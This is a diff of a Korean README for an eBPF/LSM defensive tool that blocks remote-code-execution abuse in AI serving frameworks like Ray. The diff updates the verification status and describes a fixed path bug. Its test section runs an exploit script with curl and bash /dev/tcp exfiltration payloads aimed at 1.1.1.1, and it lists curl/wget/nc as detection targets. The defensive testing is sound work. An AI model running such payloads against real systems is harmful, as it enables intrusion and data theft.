@@ -10,8 +10,8 @@ AI 서빙 프레임워크(Ray, vLLM, Triton 등)에서 발견되는 원격 코�
 - **SHADOW_EXEC**: AI 워커 계보가 curl/wget/nc 등 의심 바이너리를 실행하는 순간 탐지
 - **SHADOW_CONNECT**: AI 워커 계보가 신뢰되지 않은 목적지로 `connect()`를 시도하는 순간 탐지 — bash `/dev/tcp/`처럼 별도 바이너리를 실행하지 않는 우회도 바이너리 종류와 무관하게 포착
 
-둘 다 "행위 발생 후 SIGKILL"이라는 공통 한계가 있어, 이를 보완하는 **실험적 3번째 계층**을 추가로 제공한다(검증 대기, 아래 "LSM 기반 사전 차단" 절 참고).
-- **LSM 사전 차단**(`kshield_vpatch_lsm`): `security_bprm_check_security`/`security_socket_connect` LSM 훅에서 동기적으로 `-EPERM`을 반환하여 execve()/connect() 자체를 실패시킨다. SIGKILL과 달리 "죽이기 전에 막기"이지만, `CONFIG_BPF_LSM` 및 부팅 파라미터 의존성이 있다.
+둘 다 "행위 발생 후 SIGKILL"이라는 공통 한계가 있어, 이를 보완하는 **3번째 계층**을 추가로 제공한다(기능 검증 완료, 아래 "LSM 기반 사전 차단" 절 참고).
+- **LSM 사전 차단**(`kshield_vpatch_lsm`): `security_bprm_check_security`/`security_socket_connect` LSM 훅에서 동기적으로 `-EPERM`을 반환하여 execve()/connect() 자체를 실패시킨다. SIGKILL과 달리 "죽이기 전에 막기"이며, VM 실측으로 확인하였다. `CONFIG_BPF_LSM` 및 부팅 파라미터(`lsm=...,bpf`) 의존성이 있다.
 
 ## 배경
 
@@ -76,8 +76,8 @@ python3 attack/benchmark_vpatch.py --count 500 --output metrics_vpatch_on.csv
 
 ## 상태
 
-**PoC 검증 완료 (v3, kprobe/tracepoint 기반).** LSM 기반 사전 차단(실험적)은
-아래 별도 절 참고 — 코드 작성만 완료, VM 검증 대기.
+**PoC 검증 완료 (v3, kprobe/tracepoint 기반).** LSM 기반 사전 차단도 기능
+검증 완료 — 아래 별도 절 참고. 성능 오버헤드 측정만 아직 미수행.
 
 VM 실측(Ubuntu, 실제 curl/bash 사용)으로 다음을 확인하였다.
 - 빌드: 컴파일·CO-RE 재배치·attach 모두 에러 없이 성공
@@ -92,14 +92,24 @@ VM 실측(Ubuntu, 실제 curl/bash 사용)으로 다음을 확인하였다.
 
 `paper_draft.md`에 위 결과가 전부 반영되어 있다.
 
-## LSM 기반 사전 차단 (실험적, VM 검증 대기)
+## LSM 기반 사전 차단 (기능 검증 완료)
 
 SHADOW_EXEC/SHADOW_CONNECT는 둘 다 "행위가 발생한 뒤 `bpf_send_signal(9)`로
 죽이는" 방식이라, 신호가 도달하기 전에 `connect()`/`execve()`가 이미 진행될
 여지를 이론적으로 배제하지 못한다. `kshield_vpatch_lsm`은 이를 보완하는
 별도 컴포넌트로, `security_bprm_check_security`/`security_socket_connect`
 LSM 훅에서 시스템 콜 반환값 자체를 `-EPERM`으로 대체하여 동기적으로
-막는다. **아직 VM에서 빌드·attach·기능 검증 전이다.**
+막는다.
+
+**VM 실측 결과**: `lsm=...,bpf` 부팅 설정 후 빌드·attach 성공(`bpftool link
+list`로 두 훅 모두 `attach_type lsm_mac` 확인). 정상 job은 오탐 없이 통과,
+bash `/dev/tcp/` 우회는 `connect()` 시점에 즉시 실패(`Operation not
+permitted`)로 확인. 실측 중 `suspicious_bins[]`가 `/usr/bin/curl`은 막고
+`/bin/curl`(셸의 `$PATH` 재탐색 경로, 우분투에서는 동일 파일의 심볼릭 링크)은
+놓치는 버그를 발견하여 `kshield_vpatch.bpf.c`(v3)와 `kshield_vpatch_lsm.bpf.c`
+양쪽에서 수정하였다 — 수정 전에도 SHADOW_CONNECT/socket_connect 계층이
+실제 연결 시도를 막아 데이터 유출은 없었다(defense-in-depth 실증).
+성능 오버헤드 측정은 아직 미수행.
 
 ```bash
 # 0) 사전 확인 — 둘 다 충족해야 attach가 성공한다
@@ -122,10 +132,9 @@ python3 ../attack/exploit_shadowray.py --cmd "curl http://1.1.1.1/"
 python3 ../attack/exploit_shadowray.py --cmd "bash -c 'exec 3<>/dev/tcp/1.1.1.1/80; echo leaked >&3'"
 ```
 
-빌드/attach/차단 동작이 실제로 확인되면 `paper_draft.md` 3.5절과 4장에
-결과를 반영할 예정이다. `kshield_vpatch`(v3, kprobe 기반)는 이 컴포넌트와
-무관하게 계속 독립적으로 동작하므로, LSM attach가 실패하는 환경에서도
-기본 방어선은 그대로 유지된다.
+위 결과는 `paper_draft.md` 3.5절에 반영되어 있다. `kshield_vpatch`(v3,
+kprobe 기반)는 이 컴포넌트와 무관하게 계속 독립적으로 동작하므로, LSM
+attach가 실패하는 환경(재부팅 불가 등)에서도 기본 방어선은 그대로 유지된다.
 
 ## 4장 실험: 성능 오버헤드 측정 절차 (완료, 재측정 시 참고)
 
